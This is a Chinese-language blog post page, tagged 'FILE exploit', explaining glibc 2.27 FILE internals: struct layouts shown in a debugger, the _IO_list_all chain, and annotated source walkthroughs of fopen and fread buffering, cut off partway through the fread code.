<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="IO FILE FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数  linux操作系统也提供了open,read等一系列文件操作函数 两者的区别是,linux这一套系统调用基于文件描述符fd, 但是glibc文件io这一套基于文件指针_IO_FILE*,指向一个FILE对象,这个对象中包装着文件描述符fd  datastructure FILE相关">
<meta property="og:type" content="article">
<meta property="og:title" content="IO_FILE">
<meta property="og:url" content="http://deutschball.github.io/2024/10/17/IO%20FILE/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="IO FILE FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数  linux操作系统也提供了open,read等一系列文件操作函数 两者的区别是,linux这一套系统调用基于文件描述符fd, 但是glibc文件io这一套基于文件指针_IO_FILE*,指向一个FILE对象,这个对象中包装着文件描述符fd  datastructure FILE相关">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-10-17T15:10:00.000Z">
<meta property="article:modified_time" content="2024-10-19T15:38:59.003Z">
<meta property="article:author" content="dustball">
<meta property="article:tag" content="FILE exploit">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>IO_FILE | dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          IO_FILE
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:10:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:10:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-19 23:38:59" itemprop="dateModified" datetime="2024-10-19T23:38:59+08:00">2024-10-19</time>
              </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="io-file">IO FILE</h1>
<p>FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数</p>
<blockquote>
<p>linux操作系统也提供了<code>open</code>,<code>read</code>等一系列文件操作函数</p>
<p>两者的区别是,linux这一套系统调用基于文件描述符<code>fd</code>,</p>
<p>但是glibc文件io这一套基于文件指针<code>_IO_FILE*</code>,指向一个<code>FILE</code>对象,这个对象中包装着文件描述符<code>fd</code></p>
</blockquote>
<h2 id="datastructure">datastructure</h2>
<p>FILE相关的声明在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glibc2.27/libio/libioP.h</span><br><span class="line">glibc2.27/libio/bits/libio.h</span><br></pre></td></tr></table></figure>
<p><code>FILE</code>实际上是<code>_IO_FILE</code>的别名,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>x86_64</code>上,<code>FILE</code>结构体大小为<code>0xd8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p <span class="title function_">sizeof</span><span class="params">(FILE)</span></span><br><span class="line">$5 = <span class="number">0xd8</span></span><br></pre></td></tr></table></figure>
<p>在glibc中保存了一个全局指针<code>_IO_list_all</code></p>
<p>它指向程序第一个<code>IO_FILE</code>结构体,也就是<code>stderr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ptype _IO_list_all</span><br><span class="line">type = <span class="keyword">struct</span> _IO_FILE_plus &#123;</span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125; *</span><br><span class="line">gef➤  p &amp;_IO_list_all</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7dd3660</span> &lt;__GI__IO_list_all&gt;</span><br><span class="line">gef➤  p _IO_list_all</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7ffff7dd3680</span> &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>
<p>实际上打印其类型时发现并不是一个<code>_IO_FILE</code>,而是一个<code>_IO_FILE_plus</code>,这两者是包含关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>stderr,stdout,stdin</code>,实际上就是三个FILE</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924184530135.png"
alt="image-20240924184530135" />
<figcaption aria-hidden="true">image-20240924184530135</figcaption>
</figure>
<h2 id="algorithm">algorithm</h2>
<h3 id="fopen">fopen</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fopen	_IO_new_fopen @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">87</span></span><br><span class="line">	-&gt;__fopen_internal @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">56</span></span><br><span class="line">		</span><br><span class="line">        new_f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> locked_FILE));		<span class="comment">//locked_FILE = &#123;IO_FILE_plus fp; _IO_lock_t; _IO_wide_data;&#125;</span></span><br><span class="line">		</span><br><span class="line">		_IO_JUMPS	<span class="comment">//new_f-&gt;fp-&gt;vtable = &amp;_IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        -&gt;_IO_new_file_init_internal @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">106</span></span><br><span class="line">            -&gt;_IO_link_in @glibc<span class="number">-2.27</span>/libio/genops.c:<span class="number">86</span></span><br><span class="line">				fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;		<span class="comment">//头插法上链</span></span><br><span class="line">				_IO_list_all = fp;</span><br><span class="line"></span><br><span class="line">		-&gt;_IO_new_file_fopen @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">212</span></span><br><span class="line">            语法分析打开模式(rwa/+xbmce)</span><br><span class="line">            -&gt;_IO_file_open @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">181</span></span><br><span class="line">                -&gt;file._fileno = open() 使用系统调用,返回文件描述符</span><br><span class="line">                -&gt;_IO_link_in										<span class="comment">//实际上已经在_IO_link_in上过链了,哈基米知道已经上链会自己判重的</span></span><br><span class="line">                </span><br><span class="line">        如果_IO_new_file_fopen返回了文件指针fp,说明打开文件成功</span><br><span class="line">        否则-&gt;_IO_un_link 下链然后 <span class="built_in">free</span>(new_f)</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924183957858.png"
alt="file = fopen" />
<figcaption aria-hidden="true">file = fopen</figcaption>
</figure>
<h3 id="fread">fread</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp);</span><br></pre></td></tr></table></figure>
<p>从fp指向的文件,
每次读取size宽度的数据,读取count个单位的数据,到缓冲区buf,
返回实际读取字节数</p>
<h4 id="申请缓冲区">申请缓冲区</h4>
<p>fread包装了read系统调用, 在堆块上建立缓冲区,
一次性使用read读取大量数据到缓冲区,减少多次调用read造成的上下文切换和io开销</p>
<p>第一次调用fread函数,_IO_file_xsgetn首先判断当前FILE是否有缓冲区,如果没有则申请一个,会在堆上要0x1000个字节的堆块,也就是1K的堆块作为缓冲区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br><span class="line">			-&gt;_IO_doallocbuf</span><br><span class="line">				-&gt;_IO_file_doallocate @glibc2<span class="number">.27</span>/libio/filedoalloc.c:<span class="number">77</span></span><br><span class="line">					-&gt;p=<span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line">					-&gt;_IO_setb(_IO_FILE *f=fp, <span class="type">char</span> *b=p, <span class="type">char</span> *eb=p+<span class="number">0x1000</span>, <span class="type">int</span> a=<span class="number">1</span>)	@glibc2<span class="number">.27</span>/libio/genops.c: <span class="number">346</span></span><br><span class="line">						如果fp之前有缓冲区,现在要喜新厌旧了</span><br><span class="line">						fp-&gt;_IO_buf_base=b</span><br><span class="line">						fp-&gt;_IO_buf_end=eb</span><br><span class="line">						<span class="keyword">if</span>(a == <span class="number">1</span>) f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>
<p>申请缓冲区这部分代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);						<span class="comment">//申请缓冲区去了</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>申请完了后开始读取</p>
<h4 id="读取数据">读取数据</h4>
<p>读取的逻辑是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//have表示当前缓冲区中,剩余字节数</span><br><span class="line">//want表示还剩多少字节需要读,当want降为0时意味着满足了需求</span><br><span class="line"></span><br><span class="line">如果缓冲区余料多于需求,则直接满足</span><br><span class="line">否则</span><br><span class="line">	如果一整个缓冲区的大小足够want则先放到缓冲区然后满足</span><br><span class="line">	否则也就是说一整个缓冲区大小都不够,此时缓冲没有意义了,直接全系统调用满足</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)		<span class="comment">//fp文件指针,data目的地,n总共需要读取的字节数</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;		<span class="comment">//want剩余想要读取的字节数, have缓冲区剩余的字节数</span></span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span> *s = data;				<span class="comment">//s作为data的迭代器</span></span><br><span class="line"></span><br><span class="line">  want = n;					</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处略去没有缓冲区时申请缓冲区的逻辑</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;				<span class="comment">//直到读取到文件EOF或者满足了want的要求才会跳出循环</span></span><br><span class="line">      	have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;		<span class="comment">//缓冲区末尾与当前指针的距离,就是缓冲区剩余字节数</span></span><br><span class="line">      	<span class="keyword">if</span> (want &lt;= have)&#123;								<span class="comment">//如果缓冲区中余料充足</span></span><br><span class="line">	  		<span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);				</span><br><span class="line">	  		fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  		want = <span class="number">0</span>;									<span class="comment">//已满足要求</span></span><br><span class="line">		&#125; <span class="keyword">else</span>	&#123;										<span class="comment">//否则</span></span><br><span class="line">            	<span class="comment">//如果控制流到此,说明缓冲区余料太少了,不能直接满足want要求</span></span><br><span class="line">	  		<span class="keyword">if</span> (have &gt; <span class="number">0</span>)&#123;								<span class="comment">//如果缓冲区还有余料</span></span><br><span class="line">	      		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);	<span class="comment">//先把余料吃了再说</span></span><br><span class="line">	      		want -= have;						</span><br><span class="line">	      		fp-&gt;_IO_read_ptr += have;			<span class="comment">//此举导致read_ptr=read_end,缓冲区告罄</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  		<span class="keyword">if</span> (_IO_in_backup (fp))&#123;				<span class="comment">//当上一次刷新缓冲区被中断而没有完成时,上次动作会保存在backup缓冲区,现在要完成未竟之事</span></span><br><span class="line">	      		_IO_switch_to_main_get_area (fp);</span><br><span class="line">	      		<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//buf是整个缓冲区,而read是当前有效的缓冲区,此举在判断want是否小于整个缓冲区</span></span><br><span class="line">            <span class="comment">//当want小于一整个缓冲区时,刷新缓冲区才有意义,</span></span><br><span class="line">            <span class="comment">//如果want大于一整个缓冲区,那么此时刷新缓冲只会增加io,不如直接syscall read</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (__underflow (fp) == EOF)	<span class="comment">//只有当want小于一整个缓冲区时才会考虑刷新缓冲区</span></span><br><span class="line">					<span class="keyword">break</span>;									</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">            <span class="comment">//缓冲区复位</span></span><br><span class="line">	  		_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  		_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  		count = want;	<span 